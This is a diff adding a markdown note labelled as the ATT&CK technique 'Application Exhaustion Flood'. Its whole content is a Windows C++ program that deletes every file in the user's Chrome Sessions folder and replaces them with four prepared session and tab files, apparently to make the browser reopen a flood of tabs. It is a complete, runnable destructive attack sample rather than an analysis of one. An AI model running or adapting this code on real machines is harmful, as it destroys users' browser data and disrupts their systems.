@@ -1,0 +1,118 @@
+---
+title: "T1499.003.Application Exhaustion Flood"
+folder: "14. Impact"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+bool Copy1File() {
+    std::ifstream src("Session_13359217365936341", std::ios::binary);
+    std::ofstream dest("C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Sessions\\Session_13359217365936341", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+bool Copy2File() {
+    std::ifstream src("Session_13359217604596414", std::ios::binary);
+    std::ofstream dest("C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Sessions\\Session_13359217604596414", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+bool Copy3File() {
+    std::ifstream src("Tabs_133592149684772129", std::ios::binary);
+    std::ofstream dest("C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Sessions\\Tabs_133592149684772129", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+bool Copy4File() {
+    std::ifstream src("Tabs_133592149684772130", std::ios::binary);
+    std::ofstream dest("C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Sessions\\Tabs_133592149684772130", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+void UsunPlikiZKatalogu(const std::wstring& sciezka) {
+    WIN32_FIND_DATA findFileData;
+    HANDLE hFind = FindFirstFile((sciezka + L"\\*").c_str(), &findFileData);
+
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                std::wstring nazwaPliku = sciezka + L"\\" + findFileData.cFileName;
+                if (DeleteFile(nazwaPliku.c_str()) == FALSE) {
+
+                }
+            }
+        } while (FindNextFile(hFind, &findFileData) != 0);
+        FindClose(hFind);
+    }
+    else {
+      } 
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    std::wstring katalog = L"C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Sessions";
+    UsunPlikiZKatalogu(katalog);
+    Copy1File();
+    Copy2File();
+    Copy3File();
+    Copy4File();
+
+    return 0;
+}
